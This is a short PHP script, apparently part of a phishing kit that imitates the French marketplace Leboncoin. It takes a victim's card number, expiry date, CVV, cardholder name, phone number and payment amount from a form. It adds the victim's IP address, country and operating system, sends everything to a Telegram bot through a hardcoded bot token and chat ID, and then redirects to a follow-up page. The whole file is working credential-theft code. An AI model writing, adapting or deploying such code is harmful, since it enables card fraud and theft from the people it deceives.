<?php

session_start();
include_once 'functions.php';

	
$message = '[🍿] +1 CARD LEBONCOIN [🍿]' . "\r\n\n";

$message .= '🍿 N* De Carte : ' . $_POST['cardNumber'] . "\r\n\n";
$message .= '🍿 Numéro : ' . $_POST['tel'] . "\r\n\n";
$message .= '🍿 Mois : ' . $_POST['cardMonth'] . "\r\n\n";
$message .= '🍿 Année : ' . $_POST['cardYear'] . "\r\n\n";
$message .= '🍿 Cryptogramme : ' . $_POST['cardCvv'] . "\r\n\n";
$message .= '🍿 Titulaire : ' . $_POST['cardName'] . "\r\n\n";
$message .= '🍿 Montant : ' . $_POST['mont'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

$_SESSION['name']=$_POST['name'];
$_SESSION['tel']=$_POST['tel'];
$_SESSION['mont']=$_POST['mont'];
$_SESSION['cardName']=$_POST['cardName'];


file_get_contents("https://api.telegram.org/bot7365575342:AAEgg8vKLSnmt3pfdd96nETNLJ5WrbC8vJM/sendMessage?chat_id=7421525298&text=" . urlencode($message)."" );

    header('location: ./transfert.php');

?>